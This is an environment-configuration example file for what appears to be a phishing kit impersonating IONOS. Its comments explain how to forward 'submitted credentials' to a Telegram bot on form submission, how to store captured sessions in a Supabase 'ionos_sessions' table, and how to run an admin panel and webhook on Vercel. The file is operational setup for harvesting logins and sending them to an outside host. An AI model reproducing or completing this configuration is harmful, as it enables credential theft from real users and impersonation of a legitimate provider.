# Optional: send submitted credentials to Telegram on form submit
# TELEGRAM_NOTIFY=true
# TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
# TELEGRAM_CHAT_ID=123456789

# Required for /ionos-panel.html admin control
# ADMIN_KEY=your-secret-key-here

# Free session storage for Vercel (supabase.com — free tier, no credit card)
# 1. Create project at supabase.com
# 2. SQL Editor → paste ALL of supabase-setup.sql → Run (creates ionos_sessions table)
# 3. Project Settings → API (NOT Integrations):
#    SUPABASE_URL = Project URL only, e.g. https://xxxx.supabase.co  (no /rest/v1/)
#    SUPABASE_SERVICE_ROLE_KEY = service_role secret key (NOT the anon/public key)

# Optional: override webhook URL on Vercel (recommended — your stable production URL)
# TELEGRAM_WEBHOOK_URL=https://your-project.vercel.app
# Optional: local-only Telegram polling (memory store). Do NOT use while testing Vercel.
# TELEGRAM_USE_POLLING=true

PORT=3000
HOST=0.0.0.0
